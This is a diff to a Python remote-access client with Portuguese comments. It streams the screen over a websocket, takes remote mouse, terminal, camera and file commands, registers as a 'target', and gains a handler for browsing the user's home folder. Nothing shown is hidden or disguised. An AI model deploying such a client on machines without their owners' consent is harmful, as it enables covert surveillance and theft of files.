@@ -63,8 +63,10 @@ class RemoteClient:
     def connect(self):
         self.ws = websocket.WebSocket()
         self.ws.connect(self.server_url)
+        
         payload = {
             "type": "register",
+            "role": "target",
             "client_id": self.client_id,
             **self.get_system_info(),
         }
@@ -108,6 +110,8 @@ class RemoteClient:
             return
         with self.terminal_lock:
             self.terminal.write(data)
+
+        time.sleep(1)
 
     def send_screen(self):
         frame_buffer = b""
@@ -157,16 +161,21 @@ class RemoteClient:
                         frame_bytes = frame_buffer[start:end + 2]
                         frame_buffer = frame_buffer[end + 2:]
                 else:
+                    # Captura a imagem de forma otimizada usando gerenciador de contexto
                     screenshot = pyautogui.screenshot()
                     buffer = io.BytesIO()
-                    screenshot.save(buffer, format="JPEG", quality=55, optimize=True)
+                    screenshot.save(buffer, format="JPEG", quality=50, optimize=True) # Reduzido a qualidade de 55 para 50 para aliviar rede
                     frame_bytes = buffer.getvalue()
+                    
+                    # CORREÇÃO DE MEMÓRIA: Fecha explicitamente os buffers e imagens abertas na RAM
+                    buffer.close()
+                    screenshot.close()
 
                 if not frame_bytes:
                     continue
 
-                with Image.open(io.BytesIO(frame_bytes)) as screenshot:
-                    width, height = screenshot.size
+                with Image.open(io.BytesIO(frame_bytes)) as screenshot_obj:
+                    width, height = screenshot_obj.size
                 encoded = base64.b64encode(frame_bytes).decode("ascii")
 
                 payload = {
@@ -176,11 +185,21 @@ class RemoteClient:
                     "width": width,
                     "height": height,
                 }
-                self.ws.send(json.dumps(payload))
-                time.sleep(0.1)
+                
+                # Envia e força a limpeza de variáveis pesadas antes do próximo ciclo
+                if self.ws is not None:
+                    self.ws.send(json.dumps(payload))
+                
+                del encoded
+                del payload
+                
+                # CORREÇÃO DE RITMO: Aumentado levemente para 0.15s para dar tempo da rede esvaziar o buffer
+                time.sleep(0.15)
+                
             except Exception as exc:
                 print(f"Erro ao capturar tela: {exc}")
                 time.sleep(1)
+
 
     def stop_ffmpeg_capture(self):
         if self.ffmpeg_process is not None and self.ffmpeg_process.poll() is None:
@@ -215,7 +234,7 @@ class RemoteClient:
             if command_type == "camera_close":
                 self.stop_camera()
                 return
-            if command_type == "file_list":
+            if command_type in ("file_list", "list_files"):
                 threading.Thread(target=self.list_files, args=(payload,), daemon=True).start()
                 return
             if command_type == "file_download":
@@ -231,6 +250,10 @@ class RemoteClient:
                 self.finish_file_transfer(payload)
                 return
             msg_type = command_type
+
+        if msg_type in ("file_list", "list_files"):
+            threading.Thread(target=self.list_files, args=(payload,), daemon=True).start()
+            return
 
         if msg_type == "mouse":
             action = payload.get("action")
@@ -350,26 +373,50 @@ class RemoteClient:
             self.camera_capture = None
 
     def list_files(self, payload: dict):
-        requested_path = str(payload.get("path", "")).strip() or os.path.expanduser("~")
+        requested_path = str(payload.get("path", "")).strip()
+        
+        # Se for vazio, inicia na Home do usuário
+        if not requested_path or requested_path == ".":
+            requested_path = os.path.expanduser("~")
+
         result = {
             "type": "file_list_result",
             "client_id": self.client_id,
             "request_id": payload.get("request_id"),
             "path": requested_path,
+            "parent_path": "",
             "entries": [],
         }
         try:
             current_path = os.path.abspath(os.path.expandvars(os.path.expanduser(requested_path)))
-            for entry in sorted(os.scandir(current_path), key=lambda item: (not item.is_dir(), item.name.lower())):
-                result["entries"].append({
-                    "name": entry.name,
-                    "path": entry.path,
-                    "is_dir": entry.is_dir(),
-                    "size": entry.stat().st_size if entry.is_file() else 0,
-                })
+            parent_path = os.path.dirname(current_path)
+
+            entries = []
+            with os.scandir(current_path) as iterator:
+                for entry in iterator:
+                    try:
+                        is_dir = entry.is_dir(follow_symlinks=False)
+                        size = entry.stat().st_size if not is_dir else 0
+                        entries.append({
+                            "name": entry.name,
+                            "path": entry.path,
+                            "is_dir": is_dir,
+                            "size": size,
+                            "extension": os.path.splitext(entry.name)[1].lower(),
+                        })
+                    except Exception:
+                        continue
+
+            # Ordena diretórios primeiro e arquivos em seguida por ordem alfabética
+            entries.sort(key=lambda item: (not item["is_dir"], item["name"].lower()))
+
             result["path"] = current_path
+            result["parent_path"] = parent_path if parent_path != current_path else ""
+            result["entries"] = entries
+
         except Exception as exc:
             result["error"] = str(exc)
+
         self.send_client_message(result)
 
     def send_file(self, payload: dict):
@@ -449,6 +496,8 @@ class RemoteClient:
 
                 if payload.get("type") == "command":
                     self.handle_command(payload)
+                elif payload.get("type") in ("file_list", "list_files"):
+                    self.list_files(payload)
                 elif payload.get("type") == "ping":
                     self.ws.send(json.dumps({"type": "pong", "client_id": self.client_id}))
             except Exception as exc:
